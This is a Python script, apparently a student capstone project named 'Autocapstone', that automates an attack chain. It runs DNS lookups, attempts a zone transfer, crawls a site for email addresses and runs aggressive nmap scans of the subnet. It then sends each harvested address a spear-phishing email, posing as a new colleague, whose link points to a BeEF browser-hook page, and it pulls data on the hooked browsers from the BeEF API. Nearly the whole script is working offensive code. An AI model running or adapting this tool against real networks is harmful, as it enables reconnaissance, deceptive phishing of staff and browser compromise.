#!/usr/bin/env python

import json
import os
import subprocess
import sys
import time
from email_crawl import crawl

def write_cmd(cmd, file_name):
    with open('{}.txt'.format(file_name), 'w') as f:
        f.write(os.popen(cmd).read())

def prompt_stop():
    prompt = raw_input('Continue (y/n)? ')
    if prompt[0].lower() == 'n':
        sys.exit(1)

if __name__ == "__main__":
    # email template
    email_text = '''Hey there!<br/ >

    I'm new in the office and ran into this webpage, what is this?<br/ >

    <a href="http://192.168.169.140:3000/demos/{}.html">link</a><br/ >

    Thanks so much,<br/ >
    Mike Robinson'''

    print '----------------------------------'
    print 'Autocapstone v0.3 - Austin Jackson'
    print '----------------------------------'
    url = raw_input('Url? ')

    ##### PHASE 1
    print '\n------INFORMATION-GATHERING-------'
    print 'Performing nslookup...'
    write_cmd('nslookup {}'.format(url), 'nslookup')
    print 'Performing whois...'
    write_cmd('whois {}'.format(url), 'whois')
    print 'Finding nameservers...'
    write_cmd('dig {} NS'.format(url), 'nameservers')

    # get web server ip
    with open('nslookup.txt', 'r') as f:
        web_ip = f.read().split()[-1]
        if len(web_ip.split('.')) != 4:
            print 'nslookup failed, url not up?'
            prompt_stop()
    print 'IP of web server found.'

    # get name server ip
    with open('nameservers.txt', 'r') as f:
        for line in f.readlines():
            if line[0] != ';':
                try:
                    ip = line.split()[-1]
                    if ip.split('.')[0] == web_ip.split('.')[0]:
                        ns_ip = ip
                except:
                    continue

    # check if nameserver was found
    try:
        ns_ip
        print 'IP of name server found.'
    except NameError:
        print 'Name server could not be found.'
        prompt_stop()

    # attempt zone transfer
    try:
        write_cmd('dig @{0} {1} AXFR'.format(ns_ip, url), 'zonetransfer')
        print 'Zone Transfer was successful.'
    except NameError:
        print 'Zone Transfer failed.'
        prompt_stop()

    # crawl website for emails
    print 'Crawling the website for emails!'
    crawl(url)

    # get mail server IP
    with open('zonetransfer.txt') as f:
        for line in f.readlines():
            try:
                ip = line.split()[-1]
                if  ('mail' in line) and \
                    (ip.split('.')[0] == web_ip.split('.')[0]):
                    mail_ip = ip
                    break
            except:
                continue

    ##### PHASE 2
    print '\n------SCANNING-&-ENUMERATION------'

    # probe scan to gather IP's
    hosts = []
    subnet = '.'.join(web_ip.split('.')[0:3]) + '.0/24'
    print 'Performing probe scan on {}...'.format(subnet)
    write_cmd('nmap -sP {}'.format(subnet), 'nmap_probe')
    with open('nmap_probe.txt') as f:
        for line in f.read().splitlines():
            if 'Nmap scan report' in line:
                hosts.append(line.split()[-1])

    # scan discovered hosts
    print 'Agressively scanning hosts (this may take a while)...'
    for host in hosts:
        print 'Scanning {}'.format(host)
        write_cmd('nmap -A {}'.format(host), 'nmap_{}'.format(host))

    # get mail server IP
    with open('zonetransfer.txt') as f:
        for line in f.readlines():
            try:
                ip = line.split()[-1]
                if  ('mail' in line) and \
                    (ip.split('.')[0] == web_ip.split('.')[0]):
                    mail_ip = ip
                    break
            except:
                continue

    # auto spear phish
    try:
        mail_ip
        print "IP of mail server found, attempting spear phishing."

        email_count = 0
        with open("emails.txt") as f:
            for victim in f.read().splitlines():
                email_count += 1
                fname = victim.split('@')[0]

                # create custom redirects
                subprocess.Popen(['cp', \
                '/usr/share/beef-xss/extensions/demos/html/redirect.html', \
                '/usr/share/beef-xss/extensions/demos/html/{}.html'.format(\
                fname)])

                with open('/root/scripts/fake_email.html', 'w') as f:
                    f.write(email_text.format(fname))

                email_cmd = list('sendemail -f mrobinson@{0} -t {1} \
                -u \"Hello!\" -s {2}:25 -o message-content-type=html \
                -o message-file=/root/scripts/fake_email.html'.format(\
                url, victim, mail_ip).split())
                subprocess.Popen(email_cmd)

                print "Spear phishing email sent to {}!".format(victim)

        # wait until check in
        raw_input("Press ENTER when beef has all browsers reported in!")
    except NameError:
        print "Mail server IP was not found, not attempting spear phishing."

    # get hooks from beef
    token = os.popen('curl -H "Content-Type: application/json" -X POST \
    -d \'{"username":"beef", "password":"beef"}\' \
    http://127.0.0.1:3000/api/admin/login').read().split('"')[-2]
    write_cmd('curl http://127.0.0.1:3000/api/hooks?token='+token, 'hooks')
    with open('hooks.txt', 'r') as f:
        hook_data = json.load(f)

    # get sessions for browsers
    beef_data = []
    for n in range(email_count):
        try:
            session = hook_data['hooked-browsers']['offline'][str(n)]['session']
            name    = hook_data['hooked-browsers']['offline'][str(n)]\
                      ['page_uri'][34:-5]
            beef_data.append([session, name])
        except:
            continue

    # generate files with browser info
    for data in beef_data:
        name = data[1]
        write_cmd('curl http://127.0.0.1:3000/api/hooks/{0}?token={1}'.format(\
        name, token), '{}_browser'.format(name))
        with open('{}_browser.txt'.format(name), 'r') as f:
            browser_data = json.load(f)
        print '{0} using {1} {2}'.format(name, browser_data['BrowserName'], \
        browser_data['BrowserVersion'])

    print '----------------------------------'
    print 'Done, double check files please!!!'
    print '----------------------------------'
